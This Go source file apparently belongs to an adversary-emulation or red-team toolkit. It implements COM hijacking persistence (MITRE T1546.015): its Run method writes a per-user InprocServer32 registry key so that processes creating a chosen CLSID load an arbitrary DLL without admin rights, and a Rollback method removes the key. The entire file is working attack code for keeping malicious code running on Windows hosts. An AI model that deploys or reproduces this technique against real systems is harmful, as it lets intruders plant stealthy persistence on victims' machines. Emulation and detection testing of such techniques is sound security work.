package persistence

import (
	"fmt"

	"golang.org/x/sys/windows/registry"
)

// COMHijack writes HKCU\Software\Classes\CLSID\{CLSID}\InprocServer32 so any
// process that instantiates the target CLSID for the current user loads
// DLLPath instead of the legitimate handler.  No admin required.
// MITRE T1546.015.
type COMHijack struct {
	CLSID          string // required, e.g. "{0F87369F-A4E5-4CFC-BD3E-73E6154572DD}"
	DLLPath        string // required, full path to hijacking DLL
	ThreadingModel string // default: "Apartment"
}

func (c *COMHijack) Name() string { return "com-hijack" }
func (c *COMHijack) ID() string   { return "T1546.015" }

func (c *COMHijack) Run() error {
	if c.CLSID == "" || c.DLLPath == "" {
		return fmt.Errorf("CLSID and DLLPath are required")
	}
	keyPath := fmt.Sprintf(`Software\Classes\CLSID\%s\InprocServer32`, c.CLSID)
	k, _, err := registry.CreateKey(registry.CURRENT_USER, keyPath, registry.SET_VALUE)
	if err != nil {
		return fmt.Errorf("CreateKey: %w", err)
	}
	defer k.Close()
	if err := k.SetStringValue("", c.DLLPath); err != nil {
		return err
	}
	tm := c.ThreadingModel
	if tm == "" {
		tm = "Apartment"
	}
	return k.SetStringValue("ThreadingModel", tm)
}

func (c *COMHijack) Rollback() error {
	parent := fmt.Sprintf(`Software\Classes\CLSID\%s`, c.CLSID)
	// leaf must be deleted before parent; DeleteKey only removes empty keys
	registry.DeleteKey(registry.CURRENT_USER, parent+`\InprocServer32`)
	registry.DeleteKey(registry.CURRENT_USER, parent)
	return nil
}
